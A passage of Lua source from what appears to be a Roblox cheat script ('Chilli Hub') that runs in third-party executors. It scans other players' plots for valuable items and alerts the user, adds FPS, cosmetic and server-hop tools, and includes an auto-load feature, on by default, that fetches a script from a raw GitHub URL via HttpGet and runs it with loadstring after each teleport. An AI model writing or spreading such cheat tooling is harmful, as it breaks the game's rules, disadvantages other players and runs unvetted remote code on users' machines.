					tbl17[2] = keypoint2

					do
						local values = table.pack(numberSequenceKeypointNew(1, 1))
						table.move(values, 1, values.n, 3, tbl17)
					end

					uiGradient6.Transparency = numberSequenceNew(tbl17)
					uiGradient6.Parent = shine
					TweenService:Create(uiScale, TweenInfo.new(0.42, Enum.EasingStyle.Back, Enum.EasingDirection.Out), { Scale = numVal }):Play()
					TweenService:Create(shine, TweenInfo.new(1.25, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), { Position = UDim2.fromScale(1.18, -0.12) }):Play()
					destroyAll()
					local n12 = tonumber(arg2) or 6

					pcall(function()
						game:GetService("Debris"):AddItem(chilliSpecialNotificationSlot, n12 + 1.5)
					end)

					local flag13 = false

					local function destroyAll2()
						if not flag13 then
							flag13 = true

							for idx = #list, 1, -1 do
								pcall(list[idx])
								list[idx] = nil
							end

							pcall(function()
								tween:Cancel()
							end)

							fn29(chilliSpecialNotificationSlot)

							if chilliSpecialNotificationSlot.Parent then
								pcall(function()
									chilliSpecialNotificationSlot:Destroy()
								end)
							end
						end
					end

					task.delay(n12, function()
						local flag132 = flag13
						local flag1322

						if flag13 then
							flag1322 = flag132
						else
							flag1322 = not chilliSpecialNotification.Parent
						end

						if flag1322 then
							destroyAll2()
							return
						end

						pcall(function()
							tween:Cancel()
							local tbl18 = { Scale = numVal * 0.78 }
							TweenService:Create(uiScale, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.In), tbl18):Play()

							for _, descendant in ipairs(chilliSpecialNotification:GetDescendants()) do
								if descendant:IsA("TextLabel") then
									TweenService:Create(descendant, TweenInfo.new(0.28), { TextTransparency = 1, BackgroundTransparency = 1 }):Play()
								elseif descendant:IsA("UIStroke") then
									TweenService:Create(descendant, TweenInfo.new(0.28), { Transparency = 1 }):Play()
								elseif descendant:IsA("ImageLabel") then
									TweenService:Create(descendant, TweenInfo.new(0.28), { ImageTransparency = 1 }):Play()
								elseif descendant:IsA("ViewportFrame") then
									TweenService:Create(descendant, TweenInfo.new(0.28), { BackgroundTransparency = 1, ImageTransparency = 1 }):Play()
								elseif descendant:IsA("Frame") then
									TweenService:Create(descendant, TweenInfo.new(0.28), { BackgroundTransparency = 1 }):Play()
								end
							end

							TweenService:Create(chilliSpecialNotification, TweenInfo.new(0.28), { BackgroundTransparency = 1 }):Play()
						end)

						task.delay(0.34, destroyAll2)
					end)

					task.delay(n12 + 1, destroyAll2)
					return true
				end
			end
		end

		return false
	end

	local function formatCompact2(arg)
		local match, match2 = tostring(arg or ""):gsub("[%$,/s]", ""):gsub("%s+", ""):match("^([%d%.]+)([KkMmBbTt]?)$")
		local num = tonumber(match)
		if not num then
			return nil
		end
		return num * (({ K = 1000, M = 1000000, B = 1e9, T = 1e12 })[string.upper(match2)] or 1)
	end

	local function formatCompact3(arg)
		if arg >= 1e12 then
			return string.format("$%.2fT/s", arg / 1e12)
		end

		if arg >= 1e9 then
			return string.format("$%.2fB/s", arg / 1e9)
		end

		if arg >= 1000000 then
			return string.format("$%.2fM/s", arg / 1000000)
		end

		if arg >= 1000 then
			return string.format("$%.1fK/s", arg / 1000)
		end
		return string.format("$%d/s", math.floor(arg))
	end

	local function getRootPart2(arg)
		return arg:FindFirstChild("RootPart") or arg.PrimaryPart or arg:FindFirstChildWhichIsA("BasePart")
	end

	local function fn31()
		local tbl15 = {}
		local debris = Workspace:FindFirstChild("Debris")

		if debris then
			for _, child in ipairs(debris:GetChildren()) do
				if child:IsA("BasePart") and child.Name == "FastOverheadTemplate" then
					local animalOverhead = child:FindFirstChild("AnimalOverhead")
					local displayName = animalOverhead and animalOverhead:FindFirstChild("DisplayName")
					local generation = animalOverhead and animalOverhead:FindFirstChild("Generation")

					if displayName and displayName:IsA("TextLabel") and generation and generation:IsA("TextLabel") then
						local str4 = tostring(displayName.Text or "")
						tbl15[str4] = tbl15[str4] or {}
						tbl15[str4][#tbl15[str4] + 1] = { Position = child.Position, Value = formatCompact2(generation.Text), Overhead = animalOverhead }
					end
				end
			end
		end

		return tbl15
	end

	local function fn32(arg, arg2, arg3)
		local v10, v11, v12 = ipairs(arg3[arg] or {})
		local n12 = 14
		local v13 = nil

		for _, v14 in v10, v11, v12 do
			local magnitude = (v14.Position - arg2).Magnitude

			if magnitude < n12 then
				n12 = magnitude
				v13 = v14
			end
		end

		return v13
	end

	local function fn33(arg, arg2)
		local Animal = tbl9[arg.Name]
		local n12 = type(Animal) == "table" and tonumber(Animal.Generation) or 0
		local arg22

		if n12 <= 0 then
			arg2 = arg2 and arg2.Value
			arg22 = arg2 or 0
		else
			local attribute = arg:GetAttribute("Mutation") or arg:GetAttribute("__mutation")
			local mutation = arg2 and arg2.Overhead:FindFirstChild("Mutation")

			if mutation and mutation:IsA("TextLabel") and mutation.Visible and mutation.Text ~= "" then
				attribute = mutation.Text
			end

			attribute = attribute and tbl10[tostring(attribute)]
			local n13 = 1

			if type(attribute) == "table" then
				n13 = 1 + (tonumber(attribute.Modifier) or 0)
			end

			local flag13 = false

			for _, child in ipairs(arg:GetChildren()) do
				local match = child.Name:match("^_Trait%.(.+)$")
				local Trait = match and (tbl11[match] or tbl11[match:gsub("_", " ")])

				if type(Trait) == "table" then
					if match == "Sleepy" or Trait.Name == "Sleepy" then
						flag13 = true
					else
						n13 += tonumber(Trait.MultiplierModifier) or 0
					end
				end
			end

			arg22 = math.round(n12 * n13 * (flag13 and 0.5 or 1))
			arg2 = arg2 and arg2.Value
			if arg2 and arg2 > 0 then
				return arg2
			end
		end

		return arg22
	end

	local function fn34()
		local list = {}
		local plots2 = Workspace:FindFirstChild("Plots")
		if not plots2 then
			return list, 0
		end
		local v10 = fn31()
		local n12 = 0

		for _, child in ipairs(plots2:GetChildren()) do
			for _, child2 in ipairs(child:GetChildren()) do
				if child2:IsA("Model") and tbl9[child2.Name] then
					local rootPart = getRootPart2(child2)

					if rootPart then
						local overhead = fn32(child2.Name, rootPart.Position, v10)
						local v11 = fn33(child2, overhead)

						if v11 > 0 then
							local Animal = tbl9[child2.Name]
							overhead = overhead and overhead.Overhead
							local mutation = overhead and overhead:FindFirstChild("Mutation")
							local visible = mutation and mutation:IsA("TextLabel") and mutation.Visible

							if visible then
								visible = tostring(mutation.Text or "") ~= ""
							end

							if visible then
								visible = string.lower(tostring(mutation.Text or "")) ~= "normal"
							end

							local text = nil
							local flag13 = false
							local textColor3 = nil
							local flag14 = false
							local fontFace = nil
							local textStrokeColor3 = nil
							local textStrokeTransparency = nil
							local color = nil
							local rotation = nil
							local transparency = nil

							if visible then
								text = mutation.Text
								textColor3 = mutation.TextColor3
								flag14 = mutation.RichText
								fontFace = mutation.FontFace
								textStrokeColor3 = mutation.TextStrokeColor3
								textStrokeTransparency = mutation.TextStrokeTransparency
								local uiGradient = mutation:FindFirstChildWhichIsA("UIGradient")
								flag13 = true
								color = nil
								rotation = nil
								transparency = nil

								if uiGradient then
									color = uiGradient.Color
									rotation = uiGradient.Rotation
									transparency = uiGradient.Transparency
								end
							end

							local images = {}
							local traits = overhead and overhead:FindFirstChild("Traits")

							if traits then
								for _, child3 in ipairs(traits:GetChildren()) do
									if child3:IsA("ImageLabel") and child3.Visible and child3.Image ~= "" and #images < 6 then
										images[#images + 1] = child3.Image
									end
								end
							end

							local rarity = type(Animal) == "table" and (Animal.Rarity or Animal.Tier or Animal.Rank) or nil

							list[#list + 1] = {
								Model = child2,
								Name = child2.Name,
								Value = v11,
								ValueText = formatCompact3(v11),
								Rarity = rarity and tostring(rarity) or "",
								MutationVisible = flag13,
								MutationText = text and tostring(text) or nil,
								MutationColor = textColor3,
								MutationRichText = flag14,
								MutationFontFace = fontFace,
								MutationStrokeColor = textStrokeColor3,
								MutationStrokeTransparency = textStrokeTransparency,
								MutationGradientColor = color,
								MutationGradientRotation = rotation,
								MutationGradientTransparency = transparency,
								TraitImages = images,
							}

							if n12 < v11 then
								n12 = v11
							end
						end
					end
				end
			end
		end

		return list, n12
	end

	local function fn35(arg, arg2)
		fn30(arg, 7, arg2 or "Secret Zebra")
	end

	local function fn36()
		table.clear(weakCache2)
		local v10, v11 = fn34()

		for _, v12 in ipairs(v10) do
			weakCache2[v12.Model] = { FirstSeen = -math.huge, Value = v12.Value }
		end

		n10 = v11
	end

	local function fn37()
		local now = os.clock()
		local v10, v11 = fn34()
		local list = {}
		local n12 = 0

		for _, v12 in ipairs(v10) do
			local v13 = weakCache2[v12.Model]
			local isNew = v13 == nil
			local v132 = v13 and now - v13.FirstSeen <= n8 and v12.Value > v13.Value
			v12.IsNew = isNew
			v12.IsLateValue = v132 == true

			if isNew then
				weakCache2[v12.Model] = { FirstSeen = now, Value = v12.Value }
			elseif v13.Value < v12.Value then
				v13.Value = v12.Value
			end

			if not isNew and not v132 and v12.Value > n12 then
				n12 = v12.Value
			end
		end

		local v12 = nil

		for _, v13 in ipairs(v10) do
			if (v13.IsNew or v13.IsLateValue) and v13.Value >= n9 then
				list[#list + 1] = v13

				if v13.Value > n12 and (not v12 or v13.Value > v12.Value) then
					v12 = v13
				end
			end
		end

		n10 = v11

		if flag12 and v12 then
			fn35(v12)
		elseif not flag12 then
			table.sort(list, function(arg, arg2)
				return arg.Value > arg2.Value
			end)

			for _, v13 in ipairs(list) do
				fn35(v13)
			end
		end
	end

	local function fn38()
		flag11 = false

		if connection3 then
			connection3:Disconnect()
			connection3 = nil
		end
	end

	local function fn39()
		fn38()
		fn36()
		flag11 = true
		n11 = os.clock() + n7

		connection3 = RunService.Heartbeat:Connect(function()
			if not flag11 or os.clock() < n11 then
				return
			end
			n11 = os.clock() + n7
			pcall(fn37)
		end)
	end

	local function destroyAll2()
		fn38()

		for idx = #chilliSpecialNotificationSlots, 1, -1 do
			local chilliSpecialNotificationSlot = chilliSpecialNotificationSlots[idx]

			if chilliSpecialNotificationSlot and chilliSpecialNotificationSlot.Parent then
				chilliSpecialNotificationSlot:Destroy()
			end

			chilliSpecialNotificationSlots[idx] = nil
		end

		if screenGui and screenGui.Parent then
			screenGui:Destroy()
		end

		screenGui = nil
		notificationStack = nil
	end

	v8.Event:Connect(destroyAll2)
	chilliBrainrotNotificationRuntim.Destroying:Connect(destroyAll2)

	brainrotNotificationsSection:CreateToggle({
		Name = "Brainrot Notifications",
		Default = false,
		Callback = function(arg)
			if arg then
				fn39()
			else
				fn38()
			end
		end,
	})
end

brainrotNotificationsSection:CreateToggle({
	Name = "Only New Highest",
	Note = "Only notifies when the new Brainrot is worth more than every Brainrot already present.",
	Default = true,
	Callback = function(arg)
		flag12 = arg == true
	end,
})

do
	local configMap2 = {
		["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
		["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
		["B/s"] = { Min = 1, Max = 1000, Mult = 1e9 },
		["T/s"] = { Min = 1, Max = 1000, Mult = 1e12 },
	}

	local notificationMinValueSlider = nil
	local n12 = 1
	local str4 = "M/s"

	local function fn22(arg, arg2)
		if arg ~= nil then
			n12 = math.floor(tonumber(arg) or n12)
		end

		if arg2 ~= nil then
			str4 = tostring(arg2)
		elseif notificationMinValueSlider and notificationMinValueSlider.GetUnit then
			local unit = notificationMinValueSlider:GetUnit()

			if unit and unit ~= "" then
				str4 = tostring(unit)
			end
		end

		n9 = n12 * (configMap2[str4] or configMap2["M/s"]).Mult
	end

	local function fn23(arg)
		str4 = tostring(arg)
		local configEntry = configMap2[str4] or configMap2["M/s"]

		if notificationMinValueSlider and notificationMinValueSlider.SetRange then
			notificationMinValueSlider:SetRange(configEntry.Min, configEntry.Max)
			local min = notificationMinValueSlider:Get() or configEntry.Min
			local min2 = configEntry.Min
			local max = configEntry.Max
			local n13 = math.clamp(math.floor(min + 0.5), min2, max)

			if n13 ~= min then
				notificationMinValueSlider:Set(n13)
			else
				fn22(n13, str4)
			end
		else
			fn22(nil, str4)
		end
	end

	notificationMinValueSlider = brainrotNotificationsSection:CreateSlider({
		Name = "Notification Min Value",
		Note = "Ignores newly spawned Brainrots below this generation value.",
		Min = 0,
		Max = 1000,
		Default = 0,
		AllowDecimals = false,
		Increment = 1,
		Unit = {
			Default = "M/s",
			Selector = true,
			Options = { "K/s", "M/s", "B/s", "T/s" },
			ColorEnabled = true,
			Colors = { Number = Color3.fromRGB(255, 255, 255), Suffix = Color3.fromRGB(58, 255, 55) },
			Callback = function(arg)
				fn23(arg)
			end,
		},
		Quick = false,
		Callback = function(arg)
			fn22(arg, nil)
		end,
	})
end

brainrotNotificationsSection:CreateInput({
	Name = "Notification Sound ID",
	Note = "Enter an audio asset ID, then press Apply Sound ID.",
	Placeholder = "rbxassetid://123456789",
	Default = "rbxassetid://110902246151945",
	MaxLength = 40,
	Callback = function(arg)
		fn20(arg)
	end,
})

brainrotNotificationsSection:CreateButton({
	Name = "Apply Sound ID",
	ButtonText = "Apply",
	Callback = function()
		task.spawn(function()
			fn21()
		end)
	end,
})

local performanceSection
performanceSection = miscTab:CreateSection({ Name = "Performance", Expanded = true })
local flag13 = false

performanceSection:CreateSlider({
	Name = "FPS Cap",
	Min = 30,
	Max = 1000,
	Default = 240,
	AllowDecimals = false,
	Increment = 1,
	Unit = " FPS",
	Quick = false,
	Callback = function(arg)
		local clamp = math.clamp
		local floor = math.floor
		local v9 = clamp(floor(tonumber(arg) or 240), 30, 1000)
		if type(setfpscap) == "function" and pcall(setfpscap, v9) then
			flag13 = false
			return
		end

		if not flag13 then
			flag13 = true
			uiLibrary.Notify("FPS Cap Unavailable", "This environment does not support setfpscap.", 5)
		end
	end,
})

do
	local n12 = 300
	local flag14 = false
	local n13 = 0
	local v9 = nil
	local tbl13 = {}
	local tbl14 = {}
	local weakCache3 = setmetatable({}, { __mode = "k" })
	local chilliOptimizerRuntime = CoreGui:FindFirstChild("__ChilliOptimizerRuntime")

	if chilliOptimizerRuntime then
		local cleanup2 = chilliOptimizerRuntime:FindFirstChild("Cleanup")

		if cleanup2 and cleanup2:IsA("BindableEvent") then
			pcall(function()
				cleanup2:Fire()
			end)
		end

		pcall(function()
			chilliOptimizerRuntime:Destroy()
		end)
	end

	local chilliOptimizerRuntime2 = Instance.new("Folder")
	chilliOptimizerRuntime2.Name = "__ChilliOptimizerRuntime"
	chilliOptimizerRuntime2.Archivable = false
	chilliOptimizerRuntime2.Parent = CoreGui
	local cleanup2 = Instance.new("BindableEvent")
	cleanup2.Name = "Cleanup"
	cleanup2.Parent = chilliOptimizerRuntime2

	local function disconnectAll2()
		for _, v10 in ipairs(tbl13) do
			if v10.Connected then
				v10:Disconnect()
			end
		end

		table.clear(tbl13)
	end

	local function fn22()
		local n14 = 0

		for k, v10 in pairs(weakCache3) do
			if k.Parent then
				for k2, v11 in pairs(v10) do
					pcall(function()
						k[k2] = v11.Value
					end)
				end
			end

			weakCache3[k] = nil
			n14 += 1

			if n14 % n12 == 0 then
				RunService.Heartbeat:Wait()
			end
		end
	end

	local function fn23()
		flag14 = false
		n13 += 1
		disconnectAll2()

		if v9 then
			pcall(task.cancel, v9)
			v9 = nil
		end

		fn22()

		for idx = #tbl14, 1, -1 do
			local v10 = tbl14[idx]
			pcall(v10.Setter, v10.Value)
		end

		table.clear(tbl14)
	end

	local v10, v11, v12

	local function fn24()
	end

	cleanup2.Event:Connect(fn23)
	chilliOptimizerRuntime2.Destroying:Connect(fn23)

	performanceSection:CreateToggle({
		Name = "Optimizer",
		Default = false,
		Callback = function(arg)
			if arg then
				fn24()
			else
				fn23()
			end
		end,
	})
end

do
	local flag14 = false
	local connection4 = nil
	local connection5 = nil
	local playerMap = {}
	local playerMap2 = {}

	local function isAccessory(arg)
		return arg:IsA("Accessory") or arg:IsA("Clothing") or arg:IsA("ShirtGraphic")
	end

	local function destroyAll(arg)
		if flag14 and arg.Parent and isAccessory(arg) then
			pcall(function()
				arg:Destroy()
			end)
		end
	end

	local function fn22(arg)
		if not (not flag14 or not arg) then
			for _, descendant in ipairs(arg:GetDescendants()) do
				destroyAll(descendant)
			end
		end
	end

	local function fn23(player)
		local playerEntry = playerMap[player]

		if playerEntry then
			playerEntry:Disconnect()
			playerMap[player] = nil
		end

		local playerEntry2 = playerMap2[player]

		if playerEntry2 then
			playerEntry2:Disconnect()
			playerMap2[player] = nil
		end
	end

	local function fn24(arg, arg2)
		local playerEntry = playerMap[arg]

		if playerEntry then
			playerEntry:Disconnect()
		end

		playerMap[arg] = arg2.DescendantAdded:Connect(function(descendant)
			if flag14 and isAccessory(descendant) then
				task.defer(destroyAll, descendant)
			end
		end)

		fn22(arg2)
	end

	local function fn25(player)
		fn23(player)

		playerMap2[player] = player.CharacterAdded:Connect(function(character_)
			if flag14 then
				fn24(player, character_)
			end
		end)

		if player.Character then
			fn24(player, player.Character)
		end
	end

	local function fn26()
		flag14 = false

		if connection4 then
			connection4:Disconnect()
			connection4 = nil
		end

		connection5:Disconnect()
		connection5 = nil

		for k in pairs(playerMap2) do
			fn23(k)
		end

		for k in pairs(playerMap) do
			fn23(k)
		end
	end

	local function fn27()
		if not flag14 then
			flag14 = true
			connection4 = Players.PlayerAdded:Connect(fn25)
			connection5 = Players.PlayerRemoving:Connect(fn23)

			for _, player in ipairs(Players:GetPlayers()) do
				fn25(player)
			end
		end
	end

	fn(fn26)

	performanceSection:CreateToggle({
		Name = "Hide Player Cosmetics",
		Default = false,
		Callback = function(arg)
			if arg then
				fn27()
			else
				fn26()
			end
		end,
	})
end

local name
name = "ChilliFpsPingGui"
local n12
n12 = 132
local n13
n13 = 0.085
local n14
n14 = 0.2
local getUDim2, fn22
local v9 = mainWindow:CreateState({ Name = "FPS and Ping Position", Default = {} })

getUDim2 = function()
	local v10 = v9:Get()
	if type(v10) == "table" and type(v10.XOffset) == "number" and type(v10.YOffset) == "number" then
		return UDim2.new(tonumber(v10.XScale) or 0, v10.XOffset, tonumber(v10.YScale) or 0, v10.YOffset)
	end
	return UDim2.new(0, 16, 0, 16)
end

fn22 = function(arg)
	v9:Set({ XScale = arg.X.Scale, XOffset = arg.X.Offset, YScale = arg.Y.Scale, YOffset = arg.Y.Offset })
end

local color
color = Color3.fromRGB(58, 255, 55)

do
	local color2 = Color3.fromRGB(255, 214, 84)
	local color3 = Color3.fromRGB(255, 96, 96)
	local color4 = Color3.fromRGB(150, 150, 158)
	local flag14 = false
	local connections3 = {}
	local screenGui2 = nil
	local frame = nil
	local uiScale = nil
	local textLabel2 = nil
	local textLabel3 = nil
	local n15 = 1
	local n16 = 0
	local n17 = 0
	local text = nil
	local text2 = nil
	local gothamBold = Enum.Font.GothamBold

	pcall(function()
		gothamBold = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold, Enum.FontStyle.Normal)
	end)

	local function fn23(arg)
		if typeof(gothamBold) == "Font" then
			arg.FontFace = gothamBold
		else
			arg.Font = Enum.Font.GothamBold
		end
	end

	local function fn24(arg)
		if arg >= 100 then
			return color
		end

		if arg >= 50 then
			return color2
		end
		return color3
	end

	local function fn25(arg)
		if arg <= 90 then
			return color
		end

		if arg <= 180 then
			return color2
		end
		return color3
	end

	local function clampValue()
		if not uiScale then
			return
		end
		local currentCamera = Workspace.CurrentCamera
		currentCamera = currentCamera and currentCamera.ViewportSize or Vector2.new(1280, 720)

		if currentCamera.X < 1 then
			currentCamera = Vector2.new(1280, 720)
		end

		uiScale.Scale = math.clamp(currentCamera.X * n13 / n12, 0.7, 1.4) * n15
	end

	local function disconnectAll2()
		for _, v10 in ipairs(connections3) do
			pcall(function()
				v10:Disconnect()
			end)
		end

		table.clear(connections3)

		if screenGui2 then
			pcall(function()
				screenGui2:Destroy()
			end)
		end

		screenGui2 = nil
		frame = nil
		uiScale = nil
		textLabel2 = nil
		textLabel3 = nil
		text = nil
		text2 = nil
		n16 = 0
	end

	local function createTextLabel(parent, arg, arg2, textXAlignment, textColor3)
		local textLabel = Instance.new("TextLabel")
		textLabel.BackgroundTransparency = 1
		textLabel.Position = UDim2.fromOffset(arg, 9)
		textLabel.Size = UDim2.fromOffset(arg2, 16)
		textLabel.Text = ""
		textLabel.TextColor3 = textColor3
		textLabel.TextScaled = true
		textLabel.TextXAlignment = textXAlignment
		fn23(textLabel)
		textLabel.Parent = parent
		return textLabel
	end

	local function fn26()
		disconnectAll2()
		local CoreGui2 = CoreGui

		if type(gethui) == "function" then
			local ok5, result = pcall(gethui)
			ok5 = ok5 and typeof(result) == "Instance"
			local CoreGui3 = CoreGui

			if ok5 then
				CoreGui2 = result
			else
				CoreGui2 = CoreGui3
			end
		end

		local chilliFpsPingGui = CoreGui2:FindFirstChild("ChilliFpsPingGui")

		if chilliFpsPingGui then
			pcall(function()
				chilliFpsPingGui:Destroy()
			end)
		end

		screenGui2 = Instance.new("ScreenGui")
		screenGui2.Name = name
		screenGui2.DisplayOrder = 58
		screenGui2.IgnoreGuiInset = true
		screenGui2.ResetOnSpawn = false
		screenGui2.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		screenGui2.Parent = CoreGui2
		frame = Instance.new("Frame")
		frame.Active = true
		frame.AnchorPoint = Vector2.new(0, 0)
		frame.BackgroundColor3 = Color3.fromRGB(24, 24, 28)
		frame.BackgroundTransparency = 0.28
		frame.BorderSizePixel = 0
		frame.Position = getUDim2()
		frame.Size = UDim2.fromOffset(132, 34)
		frame.Parent = screenGui2
		Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
		local uiStroke = Instance.new("UIStroke")
		uiStroke.Color = Color3.fromRGB(255, 255, 255)
		uiStroke.Thickness = 1
		uiStroke.Transparency = 0.9
		uiStroke.Parent = frame
		uiScale = Instance.new("UIScale")
		uiScale.Parent = frame
		clampValue()
		textLabel2 = createTextLabel(frame, 12, 34, Enum.TextXAlignment.Left, color)
		createTextLabel(frame, 48, 22, Enum.TextXAlignment.Left, color4).Text = "FPS"
		local frame2 = Instance.new("Frame")
		frame2.AnchorPoint = Vector2.new(0.5, 0.5)
		frame2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		frame2.BackgroundTransparency = 0.85
		frame2.BorderSizePixel = 0
		frame2.Position = UDim2.new(0, 74, 0.5, 0)
		frame2.Size = UDim2.fromOffset(1, 14)
		frame2.Parent = frame
		textLabel3 = createTextLabel(frame, 82, 30, Enum.TextXAlignment.Left, color)
		createTextLabel(frame, 113, 14, Enum.TextXAlignment.Left, color4).Text = "ms"
		local currentCamera = Workspace.CurrentCamera

		if currentCamera then
			connections3[#connections3 + 1] = currentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(clampValue)
		end

		local flag15 = false
		local input = nil
		local vector2 = Vector2.new(0, 0)
		local position = nil

		connections3[#connections3 + 1] = frame.InputBegan:Connect(function(input2)
			if not (flag15 or input2.UserInputState ~= Enum.UserInputState.Begin) then
				local flag16 = input2.UserInputType == Enum.UserInputType.Touch

				if not (not (input2.UserInputType == Enum.UserInputType.MouseButton1) and not flag16) then
					local vector22 = Vector2.new(input2.Position.X, input2.Position.Y)
					local absolutePosition = frame.AbsolutePosition
					local absoluteSize = frame.AbsoluteSize

					if not (vector22.X < absolutePosition.X or vector22.X > absolutePosition.X + absoluteSize.X or vector22.Y < absolutePosition.Y or vector22.Y > absolutePosition.Y + absoluteSize.Y) then
						flag15 = true
						input = flag16 and input2 or nil
						vector2 = vector22
						position = frame.Position
						return
					end
				end
			end
		end)

		connections3[#connections3 + 1] = UserInputService.InputChanged:Connect(function(input2)
			if not (not flag15 or not frame or not position) and (input and input2 == input or not input and input2.UserInputType == Enum.UserInputType.MouseMovement) then
				local n18 = Vector2.new(input2.Position.X, input2.Position.Y) - vector2
				frame.Position = UDim2.new(position.X.Scale, position.X.Offset + n18.X, position.Y.Scale, position.Y.Offset + n18.Y)
				return
			end
		end)

		connections3[#connections3 + 1] = UserInputService.InputEnded:Connect(function(input2)
			if flag15 then
				local input3 = input and input2 == input
				local input4

				if input3 then
					input4 = input3
				else
					input4 = not input and input2.UserInputType == Enum.UserInputType.MouseButton1
				end

				if input4 then
					flag15 = false
					input = nil
					position = nil
					fn22(frame.Position)
				end
			end
		end)

		connections3[#connections3 + 1] = RunService.RenderStepped:Connect(function(deltaTime)
			if not (not flag14 or not textLabel2) then
				n16 = 1 / math.clamp(deltaTime, 0.001, 1)
				local now = os.clock()

				if not (now < n17) then
					n17 = now + n14
					local n18 = math.floor(n16 + 0.5)
					local text3 = tostring(n18)

					if text3 ~= text then
						text = text3
						textLabel2.Text = text3
						textLabel2.TextColor3 = fn24(n18)
					end

					local n19 = 0

					pcall(function()
						n19 = Stats.Network.ServerStatsItem["Data Ping"]:GetValue()
					end)

					local n20 = math.floor(n19 + 0.5)
					local text4 = tostring(n20)

					if text4 ~= text2 then
						text2 = text4
						textLabel3.Text = text4
						textLabel3.TextColor3 = fn25(n20)
					end
				end
			end
		end)
	end

	performanceSection:CreateSlider({
		Name = "FPS and Ping Size",
		Min = 60,
		Max = 160,
		Default = 100,
		AllowDecimals = false,
		Increment = 1,
		Unit = "%",
		Quick = false,
		SubOf = performanceSection:CreateToggle({
			Name = "FPS and Ping",
			Note = "Shows a small draggable readout of frame rate and ping.",
			Default = true,
			Callback = function(arg)
				flag14 = arg == true

				if flag14 then
					fn26()
				else
					disconnectAll2()
				end
			end,
		}),
		Callback = function(arg)
			n15 = math.clamp((tonumber(arg) or 100) / 100, 0.6, 1.6)
			clampValue()
		end,
	})

	fn(disconnectAll2)
end

do
	local serverSection = serverTab:CreateSection({ Name = "Server", Expanded = true })

	local function fn23()
		if type(queue_on_teleport) == "function" then
			return queue_on_teleport
		end

		if type(queueonteleport) == "function" then
			return queueonteleport
		end

		if type(syn) == "table" and type(syn.queue_on_teleport) == "function" then
			return syn.queue_on_teleport
		end

		if type(fluxus) == "table" and type(fluxus.queue_on_teleport) == "function" then
			return fluxus.queue_on_teleport
		end
		return nil
	end

	local function fn24(arg)
		pcall(function()
			TeleportService:SetTeleportSetting("__ChilliAutoLoadScriptEnabled", arg)
		end)

		if arg then
			local v10 = fn23()

			if v10 then
				if rawget(_G, "__ChilliAutoLoadQueued") ~= true then
					if not pcall(v10, [[local TeleportService = game:GetService("TeleportService")
local enabled = true
pcall(function()
    enabled = TeleportService:GetTeleportSetting("__ChilliAutoLoadScriptEnabled") == true
end)
if enabled then
    local ok, source = pcall(function()
        return game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli.lua")
    end)
    if ok and type(source) == "string" then
        local chunk = loadstring(source)
        if chunk then
            chunk()
        end
    end
end
]]) then
						return false
					end

					_G.__ChilliAutoLoadQueued = true
				end

				return true
			end

			return false
		end

		return true
	end

	local autoLoadScriptToggle = nil

	autoLoadScriptToggle = serverSection:CreateToggle({
		Name = "Auto Load Script",
		Default = true,
		Callback = function(arg)
			local flag14 = arg == true

			if not fn24(flag14) and flag14 then
				task.defer(function()
					fn24(false)

					if autoLoadScriptToggle and autoLoadScriptToggle:Get() == true then
						autoLoadScriptToggle:Set(false, false)
					end

					uiLibrary.Notify("Auto Load Unavailable", "This executor does not support queue on teleport.", 5)
				end)
			end
		end,
	})

	local str4 = "Most Players"
	local flag14 = false

	serverSection:CreateDropdown({
		Name = "Server Hop Mode",
		Options = { "Most Players", "Random", "Least Players" },
		Default = "Most Players",
		Quick = false,
		Callback = function(arg)
			str4 = tostring(arg or "Most Players")
		end,
	})

	serverSection:CreateButton({
		Name = "Server Hop",
		ButtonText = "Hop",
		Callback = function()
			if flag14 then
				return
			end
			flag14 = true

			task.spawn(function()
				local str42 = str4
				local str5 = tostring(game.JobId or "")
				local list = {}
				local flag15 = str42 == "Random"
				local str6 = str42 == "Least Players" and "Asc" or "Desc"
				local flag152 = flag15 and 3 or 1
				local nextPageCursor = nil

				for idx = 1, flag152 do
					local str7 = string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=%s&excludeFullGames=true&limit=100", game.PlaceId, str6)

					if nextPageCursor and nextPageCursor ~= "" then
						str7 ..= "&cursor=" .. HttpService:UrlEncode(nextPageCursor)
					end

					local ok5, result = pcall(function()
						return HttpService:JSONDecode(game:HttpGet(str7))
					end)

					if not ok5 or type(result) ~= "table" then
						break
					else
						local v10 = ipairs
						local data = result.data or {}

						for _, v11 in v10(data) do
							local str8 = tostring(v11.id or "")
							local huge = tonumber(v11.playing) or math.huge
							local n15 = tonumber(v11.maxPlayers) or 0

							if str8 ~= "" and str8 ~= str5 and huge < n15 then
								list[#list + 1] = { Id = str8, Playing = huge }
							end
						end

						if #list > 0 and not flag15 then
							break
						else
							nextPageCursor = result.nextPageCursor

							if not nextPageCursor or nextPageCursor == "" then
								break
							else
							end
						end
					end
				end

				if #list == 0 then
					flag14 = false
					uiLibrary.Notify("Server Hop Failed", "No different public server is currently available.", 5)
					return
				end

				if autoLoadScriptToggle and autoLoadScriptToggle:Get() == true then
					fn24(true)
				end

				local id

				if flag15 then
					id = list[math.random(1, #list)].Id
				else
					table.sort(list, function(arg, arg2)
						if str42 == "Least Players" then
							return arg.Playing < arg2.Playing
						end
						return arg.Playing > arg2.Playing
					end)

					id = list[1].Id
				end

				if not pcall(function()
					TeleportService:TeleportToPlaceInstance(game.PlaceId, id, localPlayer)
				end) then
					flag14 = false
					uiLibrary.Notify("Server Hop Failed", "Roblox could not join the selected server.", 5)
				end
			end)
		end,
	})

	serverSection:CreateButton({
		Name = "Kick",
		ButtonText = "Kick",
		ConfirmText = "",
		Callback = function()
			Players.LocalPlayer:Kick("\nDisconnected by Chilli Hub")
		end,
	})

	local flag15 = false
	local str5 = ""

	local function getMatch(arg)
		return tostring(arg or ""):match("^%s*(.-)%s*$")
	end

	serverSection:CreateInput({
		Name = "Job ID",
		Placeholder = "Paste a server Job ID...",
		Default = "",
		MaxLength = 100,
		Callback = function(arg)
			str5 = getMatch(arg)
		end,
	})

	serverSection:CreateButton({
